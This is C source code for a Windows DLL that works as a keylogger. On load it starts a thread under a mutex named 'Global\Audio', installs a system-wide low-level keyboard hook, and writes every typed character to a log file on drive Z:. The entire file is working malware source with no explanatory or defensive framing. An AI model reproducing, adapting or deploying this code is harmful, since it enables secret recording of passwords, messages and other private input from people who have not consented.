#include <stdio.h>
#include "windows.h"

HHOOK hook_handle;
BYTE keys[256];

FILE* logfile;


LRESULT CALLBACK cb(int nCode, WPARAM wParam, LPARAM lparam) {
    KBDLLHOOKSTRUCT* evt = (KBDLLHOOKSTRUCT*) lparam;
    if(nCode == HC_ACTION) {
	if(wParam == WM_KEYDOWN) {
	    switch(evt->vkCode) {
		case VK_LSHIFT:
		case VK_RSHIFT:
		    keys[VK_SHIFT] = 0x80;
		    break;

		case VK_CAPITAL:
		    keys[VK_CAPITAL] ^= 0x01;
		    break;

		default:
		    keys[evt->vkCode] = 0x80;
	    }

	    WORD str[2];
	    if(ToAscii(evt->vkCode, evt->scanCode, keys, str, 0) == 1) {
		//printf("%c", str[0]);
		fprintf(logfile, "%c", str[0]);
		fflush(logfile);
	    }
	} else if(wParam == WM_KEYUP) {
	    switch(evt->vkCode) {
		case VK_LSHIFT:
		case VK_RSHIFT:
		    keys[VK_SHIFT] = 0;
		    /* fall though */
		default:
		    if(evt->vkCode != VK_CAPITAL) {
			keys[evt->vkCode] = 0;
		    }
	    }
	}
    }

    return CallNextHookEx(hook_handle, nCode, wParam, lparam);
}

DWORD thread(void* arg) {
    Sleep(1000);
    logfile = fopen("Z:\\log", "a+");
    hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, cb, NULL, 0);
    if(!hook_handle) {
	printf("could not install hook\n");
	return 1;
    }

    if(GetKeyboardState(keys) == 0) {
	printf("could not get keyboard state\n");
    }
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0) > 0) {
	TranslateMessage(&msg);
	DispatchMessage(&msg);
    }

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
	case DLL_PROCESS_ATTACH:
	    {
		HANDLE mtx = CreateMutex(NULL, TRUE, "Global\\Audio");
		if(GetLastError() != ERROR_ALREADY_EXISTS) {
		   CreateThread(NULL, 0, thread, 0, 0, 0); 
		}
	    }
	    break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	    break;
    }
    return TRUE;
}

